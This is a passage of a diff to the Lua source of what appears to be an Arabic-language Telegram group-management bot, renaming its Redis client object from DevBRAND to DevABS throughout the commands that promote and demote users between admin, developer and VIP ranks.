-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
 end
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
@@ -4586,27 +4586,27 @@ if SudoId(result.id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.id_) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.id_) then
 secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
-if DevBRAND:sismember(BRAND..'BRAND:SudoBot:',result.id_) then
+if DevABS:sismember(BRAND..'BRAND:SudoBot:',result.id_) then
 sudobot = 'المطورين • ' else sudobot = '' end
-if DevBRAND:sismember(BRAND..'BRAND:ManagerAll:',result.id_) then
+if DevABS:sismember(BRAND..'BRAND:ManagerAll:',result.id_) then
 managerall = 'المدراء العامين • ' else managerall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:AdminAll:',result.id_) then
+if DevABS:sismember(BRAND..'BRAND:AdminAll:',result.id_) then
 adminall = 'الادمنيه العامين • ' else adminall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:VipAll:',result.id_) then
+if DevABS:sismember(BRAND..'BRAND:VipAll:',result.id_) then
 vpall = 'المميزين العامين • ' else vpall = '' end
-if DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_, result.id_) then
 basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_, result.id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevBRAND:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_) then
 manager = 'المدراء • ' else manager = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevBRAND:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_) then
 cleaner = 'المنظفين • ' else cleaner = ''
 end
 if RankChecking(result.id_,msg.chat_id_) ~= false then
@@ -4615,58 +4615,58 @@ else
 ReplyStatus(msg,result.id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
 end 
 if BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
-DevBRAND:srem(BRAND..'BRAND:SecondSudo:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:SudoBot:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:SecondSudo:', result.id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:', result.id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
-DevBRAND:srem(BRAND..'BRAND:SudoBot:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:', result.id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:VipAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'BRANDconstructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
 elseif BRANDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
 end
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
@@ -4679,7 +4679,7 @@ end
 if Sudo(msg) then
 if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
 function sudo_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:SecondSudo:',result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:SecondSudo:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4689,7 +4689,7 @@ if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^ر�
 local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:SecondSudo:',result.id_)
+DevABS:sadd(BRAND..'BRAND:SecondSudo:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4698,14 +4698,14 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
 local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:SecondSudo:',user)
+DevABS:sadd(BRAND..'BRAND:SecondSudo:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 end
 --     Source BRAND     --
 --     Rem SecondSudo     --
 if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:SecondSudo:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:SecondSudo:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4715,7 +4715,7 @@ if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^ت�
 local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:SecondSudo:',result.id_)
+DevABS:srem(BRAND..'BRAND:SecondSudo:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4724,7 +4724,7 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
 local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
-DevBRAND:srem(BRAND..'BRAND:SecondSudo:',user)
+DevABS:srem(BRAND..'BRAND:SecondSudo:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 end end
 --     Source BRAND     --
@@ -4732,7 +4732,7 @@ end end
 if SecondSudo(msg) then
 if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
 function sudo_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:SudoBot:',result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:SudoBot:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4742,7 +4742,7 @@ if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطو�
 local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:SudoBot:',result.id_)
+DevABS:sadd(BRAND..'BRAND:SudoBot:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4751,14 +4751,14 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
 local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:SudoBot:',user)
+DevABS:sadd(BRAND..'BRAND:SudoBot:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 end
 --     Source BRAND     --
 --       Rem SudoBot      --
 if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:SudoBot:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4768,7 +4768,7 @@ if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل م�
 local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:SudoBot:',result.id_)
+DevABS:srem(BRAND..'BRAND:SudoBot:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4777,7 +4777,7 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
 local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
-DevBRAND:srem(BRAND..'BRAND:SudoBot:',user)
+DevABS:srem(BRAND..'BRAND:SudoBot:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 end end
 --     Source BRAND     --
@@ -4785,7 +4785,7 @@ end end
 if SudoBot(msg) then
 if text ==('رفع مدير عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:ManagerAll:',result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:ManagerAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4795,7 +4795,7 @@ if text and text:match('^رفع مدير عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:ManagerAll:',result.id_)
+DevABS:sadd(BRAND..'BRAND:ManagerAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4804,14 +4804,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مدير عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مدير عام (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:ManagerAll:',user)
+DevABS:sadd(BRAND..'BRAND:ManagerAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 end
 --     Source BRAND     --
 --      Rem ManagerAll    --
 if text ==('تنزيل مدير عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4821,7 +4821,7 @@ if text and text:match('^تنزيل مدير عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:',result.id_)
+DevABS:srem(BRAND..'BRAND:ManagerAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4830,7 +4830,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مدير عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مدير عام (%d+)')
-DevBRAND:srem(BRAND..'BRAND:ManagerAll:',user)
+DevABS:srem(BRAND..'BRAND:ManagerAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 end end
 --     Source BRAND     --
@@ -4838,7 +4838,7 @@ end end
 if ManagerAll(msg) then
 if text ==('رفع ادمن عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:AdminAll:',result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:AdminAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4848,7 +4848,7 @@ if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:AdminAll:',result.id_)
+DevABS:sadd(BRAND..'BRAND:AdminAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4857,14 +4857,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع ادمن عام (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:AdminAll:',user)
+DevABS:sadd(BRAND..'BRAND:AdminAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 end
 --     Source BRAND     --
 --      Rem adminall      --
 if text ==('تنزيل ادمن عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:AdminAll:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4874,7 +4874,7 @@ if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:AdminAll:',result.id_)
+DevABS:srem(BRAND..'BRAND:AdminAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4883,7 +4883,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل ادمن عام (%d+)')
-DevBRAND:srem(BRAND..'BRAND:AdminAll:',user)
+DevABS:srem(BRAND..'BRAND:AdminAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 end end
 --     Source BRAND     --
@@ -4891,7 +4891,7 @@ end end
 if AdminAll(msg) then
 if text ==('رفع مميز عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:VipAll:',result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:VipAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4901,7 +4901,7 @@ if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:VipAll:',result.id_)
+DevABS:sadd(BRAND..'BRAND:VipAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4910,14 +4910,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مميز عام (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:VipAll:',user)
+DevABS:sadd(BRAND..'BRAND:VipAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 end
 --     Source BRAND     --
 --       Rem Vipall       --
 if text ==('تنزيل مميز عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:VipAll:',result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4927,7 +4927,7 @@ if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:VipAll:',result.id_)
+DevABS:srem(BRAND..'BRAND:VipAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4936,7 +4936,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مميز عام (%d+)')
-DevBRAND:srem(BRAND..'BRAND:VipAll:',user)
+DevABS:srem(BRAND..'BRAND:VipAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 end end
 --     Source BRAND     --
@@ -4945,7 +4945,7 @@ if ChatType == 'sp' or ChatType == 'gp'  then
 if SudoBot(msg) then
 if text ==('رفع مالك') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه مالك")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4955,7 +4955,7 @@ if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مالك @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه مالك")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4964,7 +4964,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مالك (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,user)
